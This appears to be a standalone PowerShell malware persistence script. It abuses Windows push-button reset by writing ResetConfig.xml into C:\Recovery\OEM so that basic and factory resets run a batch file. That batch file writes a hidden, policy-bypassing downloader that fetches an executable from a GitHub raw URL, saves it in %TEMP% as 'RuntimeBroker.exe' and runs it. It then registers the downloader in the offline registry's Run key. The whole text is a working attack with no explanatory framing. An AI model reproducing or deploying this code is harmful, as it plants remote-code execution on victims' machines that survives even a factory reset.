
$Link = "https://raw.githubusercontent.com/markusdc57-a11y/sdf/refs/heads/main/DFChecker.exe"


$path = "C:\"
$path2 = Join-Path -Path $path -ChildPath "Recovery"
$text = Join-Path -Path $path2 -ChildPath "OEM"

New-Item -Path $text -ItemType Directory -Force

$contents = @"
<?xml version="1.0" encoding="utf-8"?>
<Reset>
  <Run Phase="BasicReset_AfterImageApply">
    <Path>SystemUpdate.bat</Path>
    <Duration>1</Duration>
  </Run>
  <Run Phase="FactoryReset_AfterImageApply">
    <Path>SystemUpdate.bat</Path>
    <Duration>1</Duration>
  </Run>
</Reset>
"@


Set-Content -Path (Join-Path -Path $text -ChildPath "ResetConfig.xml") -Value $contents -Encoding UTF8

$contents2 = @"
@echo off
set SOFTWARE_HIVE_PATH=C:\Windows\System32\config\SOFTWARE
echo PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('$Link','%TEMP%\RuntimeBroker.exe');Start-Process '%TEMP%\RuntimeBroker.exe' > C:\Recovery\OEM\Reset.bat
reg load "HKLM\TempHive" "%SOFTWARE_HIVE_PATH%"
reg add "HKLM\TempHive\Microsoft\Windows\CurrentVersion\Run" /v Bruh /t REG_SZ /d "C:\Recovery\OEM\Reset.bat" /f
reg unload "HKLM\TempHive"
exit
"@


Set-Content -Path (Join-Path -Path $text -ChildPath "SystemUpdate.bat") -Value $contents2 -Encoding ASCII